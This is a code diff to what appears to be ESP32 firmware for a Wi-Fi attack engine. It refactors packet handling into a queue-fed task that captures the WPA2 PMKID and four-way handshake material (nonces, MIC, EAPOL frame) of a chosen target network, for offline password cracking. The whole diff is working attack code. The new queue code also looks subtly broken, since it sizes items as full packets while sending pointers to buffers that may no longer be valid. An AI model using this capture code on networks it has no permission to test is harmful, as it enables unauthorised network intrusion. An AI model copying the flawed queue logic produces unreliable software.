@@ -17,14 +17,151 @@
 
 static const char *TAG = "WIFI_ATTACKS";
 
-static client_t clients[MAX_CLIENTS] = { 0 };
-static SemaphoreHandle_t clients_semaphore;
-static SemaphoreHandle_t target_semaphore;
+/* Private functions */
+static void add_client_to_list(const uint8_t *mac);
+static uint8_t get_target_info_copy(target_info_t *dest, target_info_t *src);
+
+/* Tasks handlers */
 static TimerHandle_t beacon_track_timer_handle = NULL;
 static TaskHandle_t beacon_track_task_handle = NULL;
+static TaskHandle_t packet_parsing_task_handle = NULL;
+
+/* Tasks Priority and queue len */
+#define PACKET_PARSING_TASK_PRIO      5
+#define BEACON_TRACK_TASK_PRIO        10
+#define PACKET_QUEUE_LEN              50
+
+/* Queue and semaphore */
+static SemaphoreHandle_t clients_semaphore;
+static SemaphoreHandle_t target_semaphore;
+static QueueHandle_t packet_queue = NULL;
+
+/* Client and target info */
+static client_t clients[MAX_CLIENTS] = { 0 };
 static uint8_t num_clients = 0;
 static target_info_t target = { 0 };
 static handshake_info_t handshake_info = { 0 };
+
+
+/**
+ * @brief Task to parse packets received in promiscuous mode
+ */
+static void packet_parsing_task(void *param)
+{
+    while (1) 
+    {
+        wifi_promiscuous_pkt_t *packet = NULL;
+        if(xQueueReceive(packet_queue, &packet, portMAX_DELAY) == pdTRUE) 
+        {
+            struct libwifi_frame frame = { 0 };
+            struct libwifi_wpa_auth_data wpa_data = { 0 };
+            bool wpa_data_initialized = false;
+            int ret = libwifi_get_wifi_frame(&frame, (uint8_t *)packet->payload, packet->rx_ctrl.sig_len, false);
+
+            /* Failed to parse the Wi-Fi frame */
+            if (ret != 0) {
+                #ifdef DEBUG
+                ESP_LOGE(TAG, "Failed to parse wifi frame.");
+                #endif
+                goto cleanup;
+            }
+
+            /* For better reading */
+            const uint8_t *dest_mac = (uint8_t *)&frame.header.mgmt_ordered.addr1;  // Destination MAC address
+            const uint8_t *src_mac = (uint8_t *)&frame.header.mgmt_ordered.addr2;  // Source MAC address
+            const uint8_t *bssid = (uint8_t *)&frame.header.mgmt_ordered.addr3;    // BSSID
+
+            /* Capture beacon frames */
+            if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_BEACON)
+            {
+                if( isMacBroadcast(dest_mac) == true && memcmp(src_mac, target.bssid, 6) == 0 )
+                {
+                    /* Reset beacon timeout timer */
+                    if( beacon_track_timer_handle != NULL )
+                    {
+                        xTimerReset(beacon_track_timer_handle, 0);
+                    }
+                }
+            }
+
+            /* Check frame type data for EAPOLs */
+            if (frame.frame_control.type == TYPE_DATA)
+            {
+                /* Add client to the list if MAC matches the target */
+                if (isMacEqual(bssid, target.bssid) && isMacEqual(dest_mac, target.bssid)) 
+                {
+                    add_client_to_list(src_mac);
+                }
+
+                /* Skip if handshake or pmkid already captured */
+                if( handshake_info.handshake_captured == true || handshake_info.pmkid_captured == true )
+                {
+                    goto cleanup;
+                }
+
+                /* Check for EAPOL frame */
+                if( libwifi_check_wpa_handshake(&frame) == true )
+                {
+                    /* Extract WPA data from the frame */
+                    ret = libwifi_get_wpa_data(&frame, &wpa_data);
+                    if (ret != 0) {
+                        #ifdef DEBUG
+                        ESP_LOGE(TAG, "Failed to parse WPA data from EAPOL frame.");
+                        #endif
+                        goto cleanup;
+                    }
+                    wpa_data_initialized = true;
+
+                    if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M1 && isMacZero(handshake_info.mac_sta) && isMacEqual(src_mac, target.bssid) )
+                    {
+                        /* Extract ANonce from MSG 1 */
+                        memcpy(handshake_info.anonce, wpa_data.key_info.nonce, 32);
+                        memcpy(handshake_info.mac_sta, dest_mac, 6);
+                        /* Get key desccriptor version */
+                        handshake_info.key_decriptor_version = wpa_data.key_info.information & 0x0003;
+                        /* Try get PMKID */
+                        /* Minimum length for RSNIE with PMKID */
+                        if (wpa_data.key_info.key_data_length >= 20)
+                        {
+                            struct libwifi_tag_iterator iterator = { 0 };
+                            if (libwifi_tag_iterator_init(&iterator, wpa_data.key_info.key_data, wpa_data.key_info.key_data_length) == 0) 
+                            {
+                                const uint8_t *tag_data = iterator.tag_data;
+                                /* Check WPA OUI */
+                                if (tag_data[0] == 0x00 && tag_data[1] == 0x0F && tag_data[2] == 0xAC)
+                                {
+                                    memcpy(handshake_info.pmkid, tag_data + 4, 16);
+                                    handshake_info.pmkid_captured = true;
+                                    ESP_LOGI(TAG, "PMKID Captured!");
+                                }
+                            }
+                        }
+                    }
+                    else if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M2 && isMacEqual(handshake_info.mac_sta, src_mac) && isMacEqual(dest_mac, target.bssid) )
+                    {
+                        /* Extract SNonce and MIC from MSG 2 */
+                        memcpy(handshake_info.snonce, wpa_data.key_info.nonce, 32);
+                        memcpy(handshake_info.mic, wpa_data.key_info.mic, 16);
+                        /* Set MIC to zero */
+                        memset(wpa_data.key_info.mic, 0x00, 16);
+                        size_t len = libwifi_dump_wpa_auth_data(&wpa_data, handshake_info.eapol, sizeof(handshake_info.eapol));
+                        handshake_info.eapol_len = len;
+                        handshake_info.handshake_captured = true;
+                        ESP_LOGI(TAG, "Got Handshake!");
+                    }
+                }
+            }
+
+        cleanup:
+            /* Cleanup allocated resources */
+            if (wpa_data_initialized) {
+                libwifi_free_wpa_data(&wpa_data);
+            }
+            libwifi_free_wifi_frame(&frame);
+            xSemaphoreGive(target_semaphore);
+        }
+    }
+}
 
 
 /**
@@ -120,105 +257,9 @@ static void add_client_to_list(const uint8_t *mac)
 IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) 
 {   
     const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
-    struct libwifi_frame frame = { 0 };
-    struct libwifi_wpa_auth_data wpa_data = { 0 };
-    bool wpa_data_initialized = false;
-    int ret = libwifi_get_wifi_frame(&frame, (uint8_t *)packet->payload, packet->rx_ctrl.sig_len, false);
-
-    /* Failed to parse the Wi-Fi frame */
-    if (ret != 0) {
-        #ifdef DEBUG
-        ESP_LOGE(TAG, "Failed to parse wifi frame.");
-        #endif
-        return;
-    }
-
-    /* For better reading */
-    const uint8_t *dest_mac = (uint8_t *)&frame.header.mgmt_ordered.addr1;  // Destination MAC address
-    const uint8_t *src_mac = (uint8_t *)&frame.header.mgmt_ordered.addr2;  // Source MAC address
-    const uint8_t *bssid = (uint8_t *)&frame.header.mgmt_ordered.addr3;    // BSSID
-
-    /* Capture beacon frames */
-    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_BEACON)
-    {
-        if( isMacBroadcast(dest_mac) == true && memcmp(src_mac, target.bssid, 6) == 0 )
-        {
-            /* Reset beacon timeout timer */
-            if( beacon_track_timer_handle != NULL )
-            {
-                xTimerReset(beacon_track_timer_handle, 0);
-            }
-        }
-    }
-
-    /* Check frame type data for EAPOLs */
-    if (frame.frame_control.type == TYPE_DATA)
-    {
-        if( libwifi_check_wpa_handshake(&frame) == true )
-        {
-            /* Extract WPA data from the frame */
-            ret = libwifi_get_wpa_data(&frame, &wpa_data);
-            if (ret != 0) {
-                #ifdef DEBUG
-                ESP_LOGE(TAG, "Failed to parse WPA data from EAPOL frame.");
-                #endif
-                goto cleanup;
-            }
-            wpa_data_initialized = true;
-
-            if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M1 && isMacZero(handshake_info.mac_sta) && memcmp(src_mac, target.bssid, 6) == 0 )
-            {
-                /* Extract ANonce from MSG 1 */
-                memcpy(handshake_info.anonce, wpa_data.key_info.nonce, 32);
-                memcpy(handshake_info.mac_sta, dest_mac, 6);
-                /* Get key desccriptor version */
-                handshake_info.key_decriptor_version = wpa_data.key_info.information & 0x0003;
-                /* Try get PMKID */
-                /* Minimum length for RSNIE with PMKID */
-                if (wpa_data.key_info.key_data_length >= 20)
-                {
-                    struct libwifi_tag_iterator iterator = { 0 };
-                    if (libwifi_tag_iterator_init(&iterator, wpa_data.key_info.key_data, wpa_data.key_info.key_data_length) == 0) 
-                    {
-                        const uint8_t *tag_data = iterator.tag_data;
-                        /* Check WPA OUI */
-                        if (tag_data[0] == 0x00 && tag_data[1] == 0x0F && tag_data[2] == 0xAC)
-                        {
-                            memcpy(handshake_info.pmkid, tag_data + 4, 16);
-                            handshake_info.pmkid_captured = true;
-                            ESP_LOGI(TAG, "PMKID Captured!");
-                        }
-                    }
-                }
-            }
-            else if( libwifi_check_wpa_message(&frame) == HANDSHAKE_M2 && memcmp(handshake_info.mac_sta, src_mac, 6) == 0 && memcmp(dest_mac, target.bssid, 6) == 0 )
-            {
-                /* Extract SNonce and MIC from MSG 2 */
-                memcpy(handshake_info.snonce, wpa_data.key_info.nonce, 32);
-                memcpy(handshake_info.mic, wpa_data.key_info.mic, 16);
-                /* Set MIC to zero */
-                memset(wpa_data.key_info.mic, 0x00, 16);
-                size_t len = libwifi_dump_wpa_auth_data(&wpa_data, handshake_info.eapol, sizeof(handshake_info.eapol));
-                handshake_info.eapol_len = len;
-                handshake_info.handshake_captured = true;
-                ESP_LOGI(TAG, "Got Handshake!");
-            }
-        }
-        
-        /* Add client to the list if MAC matches the target */
-        if (memcmp(bssid, target.bssid, 6) == 0 && memcmp(dest_mac, target.bssid, 6) == 0) 
-        {
-            add_client_to_list(src_mac);
-        }
-    }
-
-cleanup:
-    /* Cleanup allocated resources */
-    if (wpa_data_initialized) {
-        libwifi_free_wpa_data(&wpa_data);
-    }
-    libwifi_free_wifi_frame(&frame);
-    xSemaphoreGive(target_semaphore);
+    BaseType_t xHigherPriorityTaskWoken = pdFALSE;
+    xQueueSendFromISR(packet_queue, &packet, &xHigherPriorityTaskWoken);
+    portYIELD_FROM_ISR(xHigherPriorityTaskWoken);
 }
 
 
@@ -248,6 +289,11 @@ void wifi_attack_engine_start(target_info_t *_target)
     memset(clients[0].mac, 0xFF, 6);
     memset(&handshake_info, 0, sizeof(handshake_info_t)); 
 
+    /* Initialize packet queue */
+    packet_queue = xQueueCreate(PACKET_QUEUE_LEN, sizeof(wifi_promiscuous_pkt_t));
+    /* Create packet parsing task */
+    xTaskCreate(packet_parsing_task, "packet_parsing_task", 8192, NULL, PACKET_PARSING_TASK_PRIO, &packet_parsing_task_handle);
+
     /* Start wifi promiscuos mode */
     esp_wifi_set_promiscuous(true);
     wifi_promiscuous_filter_t filter = {
@@ -267,7 +313,7 @@ void wifi_attack_engine_start(target_info_t *_target)
     xTimerStart(beacon_track_timer_handle, 0);
     if( beacon_track_task_handle == NULL )
     {
-        xTaskCreate(beacon_track_task, "beacon_track_task_handle", 4096, NULL, 10, &beacon_track_task_handle);
+        xTaskCreate(beacon_track_task, "beacon_track_task_handle", 4096, NULL, BEACON_TRACK_TASK_PRIO, &beacon_track_task_handle);
     }
 }
 
